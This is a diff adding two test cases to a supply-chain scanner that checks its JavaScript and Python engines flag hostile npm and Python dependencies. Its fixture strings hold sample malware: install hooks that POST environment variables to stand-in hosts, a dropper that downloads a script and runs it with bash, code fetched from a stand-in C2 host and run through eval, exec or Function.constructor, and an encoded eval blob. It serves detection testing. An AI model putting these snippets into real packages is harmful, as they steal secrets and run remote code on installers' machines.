@@ -200,6 +200,100 @@ class CoreParityTests(unittest.TestCase):
                                          "Install hook runs install.js, which runs a DLL with rundll32 or regsvr32 "
                                          "(node-gyp.dll).")
 
+    def test_decoded_names_started_scripts_and_the_eval_decoder(self):
+        """0.1.8 (items 5 and 6): SC-EVAL-DECODER, a dependency's install hook
+        that starts another script of the package (followed to it), names in
+        strings an install script decodes, a script it downloads and runs
+        with bash, and the received-code forms (Function.constructor, rows
+        joined, environment variables) in a dependency's import-time code."""
+        codes = ",".join(str(40 + (k % 80)) for k in range(260))
+        caesar = ("try{eval(function(s,n){return s.replace(/[a-zA-Z]/g,function(c){var b=c<=\"Z\"?65:97;"
+                  "return String.fromCharCode((c.charCodeAt(0)-b+n)%26+b)})}([" + codes + "],17))}catch(e){}\n")
+        starter = ("const { spawn } = require('child_process');\nconst path = require('path');\n"
+                   "const filePath = path.join(__dirname, 'worker/run.js');\n"
+                   "spawn(process.execPath, [filePath], { detached: true, stdio: 'ignore' }).unref();\n")
+        worker = ("const https = require('https');\nconst body = JSON.stringify(process.env);\n"
+                  "https.request({ host: 'collector.invalid', method: 'POST' }).end(body);\n")
+        metrics = ("(() => {\n  const a = require(\n    Buffer.from(\"%s\", \"hex\").toString()\n  );\n"
+                   "  const e = Object.keys(process[\"env\"]).map(k => [k, process[\"env\"][k]]);\n"
+                   "  a.request({ hostname: 'collector.invalid', method: 'POST' }).end(JSON.stringify(e));\n})();\n"
+                   % "https".encode().hex())
+        dropper = ("const fs = require('fs');\nconst { spawn } = require('child_process');\n(async () => {\n"
+                   "  const r = await fetch('https://files.invalid/s.sh');\n  fs.writeFileSync(f, await r.text());\n"
+                   "  spawn('bash', [f]);\n})();\n")
+        chained = ("const axios = require('axios');\n(async () => {\n  axios\n    .post('https://c2.invalid/a', { v })\n"
+                   "    .then((r) => {\n      new Function.constructor('require', r.data)(require);\n    });\n})();\n")
+        hook = lambda script: json.dumps({"name": "dep", "version": "1.0.0", "scripts": {"postinstall": f"node {script}"}})
+        files = {"package.json": json.dumps({"name": "app", "version": "1.0.0"}), "vendor/blob.js": caesar,
+                 "node_modules/starter/package.json": hook("lib/start.js"), "node_modules/starter/lib/start.js": starter,
+                 "node_modules/starter/lib/worker/run.js": worker,
+                 "node_modules/metrics/package.json": hook("metrics.js"), "node_modules/metrics/metrics.js": metrics,
+                 "node_modules/dropper/package.json": hook("i.js"), "node_modules/dropper/i.js": dropper,
+                 "node_modules/chained/package.json": json.dumps({"name": "chained", "version": "1.0.0", "main": "i.js"}),
+                 "node_modules/chained/i.js": chained}
+        with tree(files) as root:
+            for deps in (False, True):
+                js, py = parity.both(root, deps=deps)
+                with self.subTest(deps=deps):
+                    self.assert_same(js, py, label=f"0.1.8 decoded and started deps={deps}")
+                    found = sorted((i["rule"], i["file"].replace("\\", "/"), i["sev"]) for i in py[1]["issues"]
+                                   if i["rule"] == "SC-EVAL-DECODER" or (i["rule"] in ("SC-INSTALL-HOOK", "SC-IMPORT-RISK")
+                                                                          and i["sev"] == "CRITICAL"))
+                    want = [("SC-EVAL-DECODER", "vendor/blob.js", "CRITICAL")]
+                    if deps:
+                        want += [("SC-IMPORT-RISK", "node_modules/chained/i.js", "CRITICAL"),
+                                 ("SC-INSTALL-HOOK", "node_modules/dropper/package.json", "CRITICAL"),
+                                 ("SC-INSTALL-HOOK", "node_modules/metrics/package.json", "CRITICAL"),
+                                 ("SC-INSTALL-HOOK", "node_modules/starter/package.json", "CRITICAL")]
+                    self.assertEqual(found, sorted(want))
+                    if deps:
+                        msgs = {i["file"].replace("\\", "/"): i["msg"] for i in py[1]["issues"]
+                                if i["rule"] == "SC-INSTALL-HOOK" and i["sev"] == "CRITICAL"}
+                        self.assertEqual(msgs["node_modules/starter/package.json"],
+                                         "Install hook runs lib/start.js, which starts lib/worker/run.js, which reads "
+                                         "environment variables or credential files and sends data over the network.")
+                        self.assertEqual(msgs["node_modules/dropper/package.json"],
+                                         "Install hook runs i.js, which downloads a script and runs it with bash.")
+                        self.assertTrue(msgs["node_modules/metrics/package.json"].endswith(
+                            "(in strings it decodes as it runs)."), msgs)
+
+    def test_the_cross_file_follower(self):
+        """0.1.8 (item 10): the follower runs in both engines' --deps checks
+        (it was the Python engine's alone): a value received in one file of a
+        package and run in another, npm and Python; a function of another
+        file that runs what this one received; and a package that only parses
+        what it receives."""
+        u = "'https://c2.invalid/p'"
+        py_net = "import requests\n\ndef pull():\n    return requests.get(" + u + ").text\n"
+        js_net = "function pull() {\n  return fetch(" + u + ").then((r) => r.text());\n}\nmodule.exports = { pull };\n"
+        sp = "venv/lib/python3.12/site-packages/"
+        files = {"package.json": json.dumps({"name": "app", "version": "1.0.0"}),
+                 "node_modules/xf/package.json": json.dumps({"name": "xf", "version": "1.0.0"}),
+                 "node_modules/xf/net.js": js_net,
+                 "node_modules/xf/run.js": "const { pull } = require('./net');\npull().then((c) => eval(c));\n",
+                 "node_modules/xr/package.json": json.dumps({"name": "xr", "version": "1.0.0"}),
+                 "node_modules/xr/util.js": "exports.execute = (code) => eval(code);\n",
+                 "node_modules/xr/index.js": "const { execute } = require('./util');\n"
+                                             "fetch(" + u + ").then((r) => r.text()).then(execute);\n",
+                 "node_modules/quiet/package.json": json.dumps({"name": "quiet", "version": "1.0.0"}),
+                 "node_modules/quiet/net.js": js_net,
+                 "node_modules/quiet/run.js": "const { pull } = require('./net');\npull().then((c) => JSON.parse(c));\n",
+                 sp + "xpkg/__init__.py": "from ._net import pull\nexec(pull())\n", sp + "xpkg/_net.py": py_net,
+                 sp + "ypkg/__init__.py": "import requests\nfrom .util import run\nrun(requests.get(" + u + ").text)\n",
+                 sp + "ypkg/util.py": "def run(code):\n    exec(code)\n"}
+        with tree(files) as root:
+            for deps in (False, True):
+                js, py = parity.both(root, deps=deps)
+                with self.subTest(deps=deps):
+                    self.assert_same(js, py, label=f"cross-file follower deps={deps}")
+                    found = sorted((i["file"].replace("\\", "/"), i["msg"].split("; ")[1].split(" (")[0])
+                                   for i in py[1]["issues"] if i["rule"] == "SC-IMPORT-RISK" and "another file" in i["msg"])
+                    received = "the value is received in another file of the package"
+                    runner = "the function that runs it is in another file of the package"
+                    want = [("node_modules/xf/run.js", received), ("node_modules/xr/index.js", runner),
+                            (sp + "xpkg/__init__.py", received), (sp + "ypkg/__init__.py", runner)] if deps else []
+                    self.assertEqual(found, want)
+
     def test_report_path_collisions_exit_3_before_the_scan(self):
         with tree({"a.py": "import os\nos.system(cmd)\n"}) as root, tempfile.TemporaryDirectory() as out:
             cases = [("SARIF on the JSON default", ["--sarif", "lazaret-report.json"]),
